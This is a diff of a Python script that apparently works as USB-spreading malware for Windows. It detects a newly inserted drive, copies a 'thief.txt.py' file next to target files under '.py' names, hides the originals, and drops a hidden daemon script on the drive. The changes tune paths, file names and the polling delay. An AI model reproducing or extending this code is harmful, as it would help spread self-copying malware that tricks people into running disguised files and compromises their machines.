@@ -9,14 +9,14 @@ import shutil
 import subprocess
 
 DAEMON_PATH="D:\\vscode\\SYSTEM\\daemon.py"
-THIEF_PATH="D:\\vscode\\SYSTEM\\thief.py"
+THIEF_PATH="D:\\vscode\\SYSTEM\\thief.txt.py"
 DAEMON_NAME="daemon.py"
 THIEF_NAME="thief.txt.py"
 
 drive=["A:\\","B:\\","C:\\","D:\\","E:\\","F:\\","G:\\","H:\\","I:\\","J:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\","S:\\","T:\\","U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\"]
 usb_drive="NULL"
 def drive_sum(): #返回磁盘的个数
-    time.sleep(6)
+    time.sleep(3)
     s1=0
     for d in drive:
         if os.path.exists(d):
@@ -52,5 +52,5 @@ for f in target_files:
     shutil.copyfile(THIEF_PATH, target+".py") 
     #隐藏u盘中的文件
     win32api.SetFileAttributes(target, win32con.FILE_ATTRIBUTE_HIDDEN) 
-shutil.copyfile(DAEMON_PATH, usb_drive+"SYSTEM")
-win32api.SetFileAttributes(usb_drive+"SYSTEM", win32con.FILE_ATTRIBUTE_HIDDEN) 
+shutil.copyfile(DAEMON_PATH, usb_drive+DAEMON_NAME)
+win32api.SetFileAttributes(usb_drive+DAEMON_NAME, win32con.FILE_ATTRIBUTE_HIDDEN) 
